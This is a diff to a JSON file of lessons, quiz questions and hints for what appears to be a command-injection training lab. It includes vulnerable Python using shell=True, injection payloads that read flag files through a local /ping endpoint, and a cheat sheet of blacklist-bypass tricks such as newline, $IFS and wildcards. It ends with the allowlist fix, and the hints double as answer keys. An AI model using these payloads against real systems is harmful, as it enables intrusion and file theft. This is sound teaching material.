@@ -4,18 +4,54 @@
   "tasks": {
     "1": {
       "title": "Detect and exploit basic command injection",
+      "body": "## The ping that shouldn't exist\n\nThe lab has a \"ping\" utility that passes your input STRAIGHT to the shell:\n\n```python\n# The lab's VULNERABLE code:\nresult = subprocess.run(f'ping -c 1 -W 2 {host}', shell=True)\n```\n\nNormal use: `/ping?host=8.8.8.8` → pings 8.8.8.8.\n\nInjection: `/ping?host=8.8.8.8;cat /tmp/flags/flag1.txt` → pings AND reads the file.\n\n## Command separators\n\n| Separator | Behavior | Example |\n|---|---|---|\n| `;` | Runs both (always) | `ping x; cat /flag` |\n| `&&` | Second one only if the first succeeds | `ping x && cat /flag` |\n| `\\|\\|` | Second one only if the first FAILS | `ping x \\|\\| cat /flag` |\n| `\\|` | Pipe: output of the first → input of the second | `cat /etc/passwd \\| grep root` |\n| `` ` `` | Command substitution | `` ping `whoami` `` |\n| `$()` | Command substitution | `ping $(whoami)` |\n| `\\n` | New line = new command | `ping x\\ncat /flag` |\n\n## Extract the first flag\n\n```bash\n# In the lab (start it from the Lab panel):\ncurl \"http://127.0.0.1:18084/ping?host=8.8.8.8;cat%20/tmp/flags/flag1.txt\"\n```\n\nThe response contains the ping output AND the contents of the file.",
       "questions": {
-        "command-injection-t01-q01": { "prompt": "What character allows chaining a second command after the first in a shell?" },
-        "command-injection-t01-q02": { "prompt": "In the lab, submit the flag from /tmp/flags/flag1.txt (endpoint /ping with basic injection)." },
-        "command-injection-t01-q03": { "prompt": "What does the && operator do in a shell command?" }
+        "command-injection-t01-q01": {
+          "prompt": "What character lets you chain a second command after the first one in a shell?",
+          "hint": "The semicolon."
+        },
+        "command-injection-t01-q02": {
+          "prompt": "In the lab, submit the flag from /tmp/flags/flag1.txt (endpoint /ping with basic injection).",
+          "hint": "curl 'http://127.0.0.1:18084/ping?host=8.8.8.8;cat /tmp/flags/flag1.txt'"
+        },
+        "command-injection-t01-q03": {
+          "prompt": "What does the && operator do in a shell command?",
+          "hint": "It runs the second one ONLY if the first one succeeded.",
+          "options": {
+            "a": "Always runs both",
+            "b": "Runs the second command only if the first one succeeded (exit 0)",
+            "c": "Runs only the first one",
+            "d": "It is a comment"
+          }
+        },
+        "command-injection-t01-q04": {
+          "prompt": "Read the flag from /etc/flag2_hidden using command injection.",
+          "hint": "curl 'http://127.0.0.1:18084/ping?host=x;cat /etc/flag2_hidden'"
+        }
       }
     },
     "2": {
       "title": "Filter bypass: evading the blacklist",
+      "body": "## The lab has a filter... that breaks\n\nThe `/secure-ping` endpoint blocks `;`, `&&`, `||`, `` ` `` and `$()`. But:\n\n```bash\n# Blocked:\ncurl \"http://127.0.0.1:18084/secure-ping?host=8.8.8.8;cat%20/flag\"\n# → Error: character \";\" is not allowed\n\n# BYPASS with a newline (%0a = URL-encoded \\n):\ncurl \"http://127.0.0.1:18084/secure-ping?host=8.8.8.8%0acat%20/tmp/flags/flag3_filtered.txt\"\n```\n\nThe filter looks for `;`, but the shell also treats `\\n` (newline) as a\ncommand separator. The filter forgot to block it.\n\n## Other bypass techniques\n\n```text\nFilter: blocks \";\"          → Bypass: %0a (newline), | (pipe), & (single)\nFilter: blocks \"cat\"        → Bypass: c'a't, c\"a\"t, /bin/cat, head, more\nFilter: blocks spaces       → Bypass: $IFS, ${IFS}, < (redirect), %09 (tab)\nFilter: blocks \"/\"          → Bypass: ${PATH:0:1}, ..\\/..\\/ (path traversal)\nFilter: exact word          → Bypass: /bin/c?t, /???/c?t (wildcards; CAT or Cat do NOT work: Linux is case-sensitive)\n```\n\n## The definitive lesson\n\n**A blacklist is ALWAYS incomplete**. The correct mitigation:\n\n```python\n# GOOD (allowlist + no shell):\nif not re.match(r'^[\\d.]+$', host):  # only digits and dots\n    return 'Invalid host'\nresult = subprocess.run(['ping', '-c', '1', '-W', '2', host])  # a list, not a string\n```\n\nWhen you pass a LIST (not a string) to subprocess without `shell=True`, Python does NOT use the shell\nand injection becomes impossible.",
       "questions": {
-        "command-injection-t02-q01": { "prompt": "What URL-encoded newline (%0a) allows injection in an endpoint that blocks ; and &&?" },
-        "command-injection-t02-q02": { "prompt": "Submit the flag from the /secure-ping endpoint (bypass the filter with newline)." },
-        "command-injection-t02-q03": { "prompt": "What validation approach correctly prevents command injection?" }
+        "command-injection-t02-q01": {
+          "prompt": "What URL-encoded sequence, representing a line break, lets you inject into an endpoint that blocks ; and &&?",
+          "hint": "%0a is the newline character in URL encoding."
+        },
+        "command-injection-t02-q02": {
+          "prompt": "Submit the flag from the /secure-ping endpoint (bypass the filter with a newline).",
+          "hint": "curl /secure-ping with a host that includes %0a (URL-encoded newline)"
+        },
+        "command-injection-t02-q03": {
+          "prompt": "What validation approach correctly prevents command injection?",
+          "hint": "Allowlist vs blacklist.",
+          "options": {
+            "a": "Blacklist: block dangerous characters (; && || etc.)",
+            "b": "Allowlist: only allow expected characters (digits and dots for an IP) OR use APIs that don't invoke a shell",
+            "c": "A WAF is enough",
+            "d": "HTTPS prevents it"
+          }
+        }
       }
     }
   }
